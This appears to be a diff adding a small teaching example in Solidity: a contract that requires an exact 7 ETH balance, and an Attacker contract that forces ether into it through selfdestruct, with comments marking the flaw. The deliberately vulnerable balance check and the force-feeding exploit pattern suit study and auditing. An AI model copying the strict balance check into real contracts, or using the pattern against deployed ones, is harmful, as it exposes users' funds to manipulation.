@@ -1,0 +1,18 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract ForceFeed {
+    // VULNERABILITY: This contract thinks it can only be 7 ETH 
+    // because it has no way to receive money... or does it?
+    function withdrawBonus() public {
+        require(address(this).balance == 7 ether, "Must have exactly 7 ETH");
+        // ... logic to pay out bonus
+    }
+}
+
+contract Attacker {
+    function attack(address payable target) public payable {
+        // This forces ETH into 'target' even if it doesn't want it
+        selfdestruct(target); 
+    }
+}
